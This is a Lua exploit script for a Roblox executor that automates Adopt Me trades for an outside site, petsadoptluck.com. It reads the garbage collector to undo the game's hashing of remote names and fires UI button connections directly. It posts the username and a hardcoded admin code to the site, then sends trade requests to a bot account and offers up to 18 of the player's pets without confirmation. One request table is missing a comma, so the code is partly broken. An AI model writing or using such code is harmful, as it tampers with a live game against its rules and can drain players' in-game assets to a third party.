-- user
-- my adoptluck
print("STARTING")

-- important
task.wait(30)
local router

for i, v in next, getgc(true) do
    if type(v) == 'table' and rawget(v, 'get_remote_from_cache') then
        router = v
    end
end

local function rename(remotename, hashedremote)
    hashedremote.Name = remotename
end
-- Apply renaming to upvalues of the RouterClient.init function
table.foreach(debug.getupvalue(router.get_remote_from_cache, 1), rename)
task.wait(1)
local NewsApp = game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.Enabled
local sound = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("SoundPlayer")
local UI = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("UIManager")
local myUsername = game:GetService("Players").LocalPlayer.Name
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local url = "https://petsadoptluck.com"
local DataApiHook = game.ReplicatedStorage:WaitForChild("API"):WaitForChild("DataAPI/DataChanged")
local TradeApiHook = game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild(
    "TradeAPI/TradeRequestReceived")
getgenv().fsys = require(game:GetService("ReplicatedStorage").ClientModules.Core.ClientData)

local function FireSig(button)
    pcall(function()
        for _, connection in pairs(getconnections(button.MouseButton1Down)) do
            connection:Fire()
        end
        task.wait(1)
        for _, connection in pairs(getconnections(button.MouseButton1Up)) do
            connection:Fire()
        end
        task.wait(1)
        for _, connection in pairs(getconnections(button.MouseButton1Click)) do
            connection:Fire()
            -- print(button.Name.." clicked!")
        end
    end)
end
local HomeButton = game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.SpawnChooserDialog.UpperCardContainer.ChoicesContent.Choices.Home.Button
task.wait(5)
FireSig(HomeButton)

local inventory = fsys.get("inventory")
local inventoryPets = inventory and inventory.pets or {}

sound.FX:play("BambooButton")
UI.set_app_visibility("NewsApp", false)

task.wait(10)
-- SEND A TRADE REQUEST TO THE BOT UNTIL IT ACCEPTS MUST HAVE 10 SECONDS DELAY

-- GLOBAL VARIABLES
getgenv().admin_code = "raprapissuperdupergwapo"
getgenv().trade_type = nil
getgenv().in_trade = false
getgenv().in_trade_with = nil

-- HELPER FUNCTIONS
local HttpService = game:GetService("HttpService")

local function decodeJSON(str)
    if type(str) ~= "string" or str == "" then
        return nil
    end

    local ok, result = pcall(function()
        return HttpService:JSONDecode(str)
    end)

    if ok then
        return result
    end

    return nil
end

local function httpJSON(url, method, bodyTable)
    local response = http_request({
        Url = url,
        Method = method or "GET",
        Headers = {
            ["Content-Type"] = "application/json",
            ["Accept"] = "application/json"
        },
        Body = bodyTable and HttpService:JSONEncode(bodyTable) or nil
    })

    local status = response.StatusCode or response.status_code or 0
    local body = response.Body or response.body or ""
    print("STATUS FROM JSON FUNCTION: " .. status)
    print("BODY FROM JSON FUNCTION: " .. body)
    return status, decodeJSON(body), body
end

-- GET TRADE TYPE
local status, data, rawBody = httpJSON(url .. "/api/cookie/getcookies", "POST", {
    username = LocalPlayer.Name, -- correct property
    admin_code = getgenv().admin_code
})

print("Request finished with status:", status)

if data then
    print("Decoded response:")
    getgenv().trade_type = data.result[1].type
    print(HttpService:JSONEncode(data))
else
    print("Raw response:", rawBody)
end

--------------------------------------------HOOKS------------------------------------------------------------------------------------
DataApiHook.OnClientEvent:Connect(function(...)
    local args = {...}
    local sender, recipient -- declare outside

    if typeof(args[3]) == "table" then
        local tradeTable = args[3]
        local tradeId = tradeTable.trade_id
        if not tradeId then return end

        sender = tradeTable.sender_offer
        recipient = tradeTable.recipient_offer
        if not (sender and recipient) then return end
    end

    if args[2] == "in_active_trade" then
        getgenv().in_trade = true
        if args[1] ~= myUsername then
            getgenv().in_trade_with = args[1]
        end
    end

    if getgenv().trade_type == "WITHDRAW" then
        if recipient and recipient.negotiated and not recipient.confirmed then
            task.wait(10)
            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
        end
    end

    if getgenv().trade_type == "DEPOSIT" then
        if recipient and recipient.negotiated and not recipient.confirmed then
            print("DEPOSIT")
            task.wait(10)
            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
        end
    end

    if recipient and recipient.negotiated and recipient.confirmed then
        local status, data, rawBody = httpJSON(url .. "/api/cookie/updatecookie", "POST", {
            admin_code = getgenv().admin_code
            username = LocalPlayer.Name, -- correct property
            status = "DONE",
            type = "DONE"
        })

        print("Request finished with status:", status)

        if data then
            print("Decoded response:")
            print(HttpService:JSONEncode(data))
            task.wait(5)
            LocalPlayer:Kick("Done.")
        else
            print("Raw response:", rawBody)
        end
    end
end)

local TradeApiHook = game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild(
    "TradeAPI/TradeRequestReceived")

TradeApiHook.OnClientEvent:Connect(function(...)
    local args = {...}
    for i, v in ipairs(args) do
        print("Arg " .. i .. ":", v)
    end
end)

while not getgenv().in_trade do
    -- send trade req
    local args = {game:GetService("Players"):WaitForChild("adoptluckhandler")}
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/SendTradeRequest"):FireServer(
        unpack(args))
    task.wait(10)
end

while getgenv().in_trade and getgenv().trade_type == "DEPOSIT" do
    local addedCount = 0

    for x, y in pairs(inventoryPets) do
        if y.kind ~= "starter_egg" then
            if addedCount < 18 then
                local args = {y.unique}
                game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
                print("added " .. y.kind)
                addedCount += 1
                task.wait(1)

                -- if we just hit 18, negotiate and stop adding
                if addedCount == 18 then
                    print("Reached 18 items, negotiating...")
                    task.wait(10)
                    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
                    break
                end
            end
        end
    end

    -- if under 18 pets total, negotiate after adding all of them
    if addedCount < 18 then
        print("Under 18 items (" .. addedCount .. "), negotiating...")
        task.wait(10)
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
    end

    break
end

